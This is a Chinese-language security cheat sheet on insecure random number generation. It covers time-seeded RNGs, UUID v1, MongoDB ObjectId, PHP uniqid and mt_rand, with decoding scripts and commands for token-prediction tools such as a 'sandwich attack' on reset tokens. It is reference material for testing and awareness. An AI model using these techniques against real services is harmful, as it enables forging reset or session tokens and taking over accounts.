# 不安全的随机数生成

> 不安全的随机数生成指的是与计算中随机数生成相关的弱点，特别是当这种随机性用于安全关键目的时。随机数生成器(RNG)中的漏洞可能导致可预测的输出，攻击者可以利用这些漏洞，可能导致数据泄露或未授权访问。

## 目录

* [方法学](#方法学)
* [基于时间的种子](#基于时间的种子)
* [GUID / UUID](#guid--uuid)
    * [GUID版本](#guid版本)
* [MongoDB ObjectId](#mongodb-objectid)
* [Uniqid](#uniqid)
* [mt_rand](#mt_rand)
* [自定义算法](#自定义算法)
* [参考资料](#参考资料)

## 方法学

当随机性的来源或生成随机值的方法不够不可预测时，就会出现不安全的随机性。这可能导致可预测的输出，攻击者可以利用这些输出。下面，我们研究了几种容易出现不安全随机性的常见方法，包括基于时间的种子、GUID、UUID、MongoDB ObjectId和`uniqid()`函数。

## 基于时间的种子

许多随机数生成器(RNG)使用当前系统时间(例如，自纪元以来的毫秒数)作为种子。这种方法可能不安全，因为种子值可以很容易地预测，特别是在自动化或脚本环境中。

```python
import random
import time

seed = int(time.time())
random.seed(seed)
print(random.randint(1, 100))
```

RNG使用当前时间作为种子，这使得任何知道或能估计种子值的人都能预测结果。通过知道确切的时间，攻击者可以重新生成正确的随机值，以下是针对日期`2024-11-10 13:37`的示例。

```python
import random
import time

# 基于提供的时间戳生成种子
seed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))
random.seed(seed)

# 生成随机数
print(random.randint(1, 100))
```

## GUID / UUID

GUID(全局唯一标识符)或UUID(通用唯一标识符)是一个128位的数字，用于在计算机系统中唯一标识信息。它们通常表示为用连字符分隔的五组十六进制数字，例如`550e8400-e29b-41d4-a716-446655440000`。GUID/UUID设计为在空间和时间上都是唯一的，即使由不同系统或在不同时间生成，也能降低重复的可能性。

### GUID版本

版本标识：`xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx`
四位M和1-3位N字段编码了UUID本身的格式。

| 版本  | 说明  |
|-------|-------|
| 0 | 只有`00000000-0000-0000-0000-000000000000` |
| 1 | 基于时间或时钟序列 |
| 2 | 在RFC 4122中保留，但在许多实现中省略 |
| 3 | 基于MD5哈希 |
| 4 | 随机生成 |
| 5 | 基于SHA1哈希 |

### 工具

* [intruder-io/guidtool](https://github.com/intruder-io/guidtool) - 用于检查和攻击版本1 GUID的工具

    ```powershell
    $ guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00
    UUID version: 1
    UUID time: 2022-04-13 08:06:13.202186
    UUID timestamp: 138691299732021860
    UUID node: 91754721024
    UUID MAC address: 00:15:5d:01:ef:00
    UUID clock sequence: 2099
    
    $ guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
    ```

## MongoDB ObjectId

MongoDB ObjectId是以可预测的方式生成的，12字节的ObjectId值由以下部分组成：

* **时间戳** (4字节)：表示ObjectId的创建时间，以自Unix纪元(1970年1月1日)以来的秒数计算。
* **机器标识符** (3字节)：标识生成ObjectId的机器。通常来自机器的主机名或IP地址，使得同一台机器上创建的文档具有可预测性。
* **进程ID** (2字节)：标识生成ObjectId的进程。通常是MongoDB服务器进程的进程ID，使得同一进程创建的文档具有可预测性。
* **计数器** (3字节)：一个唯一的计数器值，每生成一个新的ObjectId就会递增。进程启动时初始化为随机值，但后续值是可预测的，因为它们是按顺序生成的。

令牌示例：
* `5ae9b90a2c144b9def01ec37`, `5ae9bac82c144b9def01ec39`

### 工具

* [andresriancho/mongo-objectid-predict](https://github.com/andresriancho/mongo-objectid-predict) - 预测MongoDB ObjectId

    ```powershell
    ./mongo-objectid-predict 5ae9b90a2c144b9def01ec37
    5ae9bac82c144b9def01ec39
    5ae9bacf2c144b9def01ec3a
    5ae9bada2c144b9def01ec3b
    ```

* 用于恢复`timestamp`、`process`和`counter`的Python脚本

    ```python
    def MongoDB_ObjectID(timestamp, process, counter):
        return "%08x%10x%06x" % (
            timestamp,
            process,
            counter,
        )

    def reverse_MongoDB_ObjectID(token):
        timestamp = int(token[0:8], 16)
        process = int(token[8:18], 16)
        counter = int(token[18:24], 16)
        return timestamp, process, counter


    def check(token):
        (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)
        return token == MongoDB_ObjectID(timestamp, process, counter)

    tokens = ["5ae9b90a2c144b9def01ec37", "5ae9bac82c144b9def01ec39"]
    for token in tokens:
        (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)
        print(f"{token}: {timestamp} - {process} - {counter}")
    ```

## Uniqid

使用`uniqid`派生的令牌基于时间戳，可以被反向工程。

* [Riamse/python-uniqid](https://github.com/Riamse/python-uniqid/blob/master/uniqid.py) 基于时间戳
* [php/uniqid](https://github.com/php/php-src/blob/master/ext/standard/uniqid.c)

令牌示例：
* uniqid: `6659cea087cd6`, `6659cea087cea`
* sha256(uniqid): `4b26d474c77daf9a94d82039f4c9b8e555ad505249437c0987f12c1b80de0bf4`, `ae72a4c4cdf77f39d1b0133394c0cb24c33c61c4505a9fe33ab89315d3f5a1e4`

### 工具

```python
import math
import datetime

def uniqid(timestamp: float) -> str:
    sec = math.floor(timestamp)
    usec = round(1000000 * (timestamp - sec))
    return "%8x%05x" % (sec, usec)

def reverse_uniqid(value: str) -> float:
    sec = int(value[:8], 16)
    usec = int(value[8:], 16)
    return float(f"{sec}.{usec}")

tokens = ["6659cea087cd6" , "6659cea087cea"]
for token in tokens:
    t = float(reverse_uniqid(token))
    d = datetime.datetime.fromtimestamp(t)
    print(f"{token} - {t} => {d}")
```

## mt_rand

仅使用两个输出值且无需暴力破解即可破解mt_rand()。

* [ambionics/mt_rand-reverse](https://github.com/ambionics/mt_rand-reverse) - 仅使用两个输出且无需任何暴力破解即可恢复mt_rand()种子的脚本。

```powershell
./display_mt_rand.php 12345678 123
712530069 674417379

./reverse_mt_rand.py 712530069 674417379 123 1
```

## 自定义算法

通常不建议创建自己的随机数算法。以下是在GitHub或StackOverflow上找到的一些示例，有时会在生产环境中使用，但可能不可靠或不安全。

* `$token = md5($emailId).rand(10,9999);`
* `$token = md5(time()+123456789 % rand(4000, 55000000));`

### 工具

通用识别和三明治攻击：

* [AethliosIK/reset-tolkien](https://github.com/AethliosIK/reset-tolkien) - 不安全的基于时间的密钥利用和三明治攻击实现资源

    ```powershell
    reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT" --prefixes "attacker@example.com" --suffixes "attacker@example.com" --timezone "-7"
    reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 -o output.txt --token-format="uniqid"
    ```

## 参考资料

* [OWASP - Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness)
* [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
* [MongoDB ObjectID Predictability](https://www.mongodb.com/docs/manual/reference/method/ObjectId/)
* [PHP: uniqid - Manual](https://www.php.net/manual/en/function.uniqid.php)
* [PHP: mt_rand - Manual](https://www.php.net/manual/en/function.mt-rand.php)
* [RFC 4122 - A Universally Unique IDentifier (UUID) URN Namespace](https://tools.ietf.org/html/rfc4122)
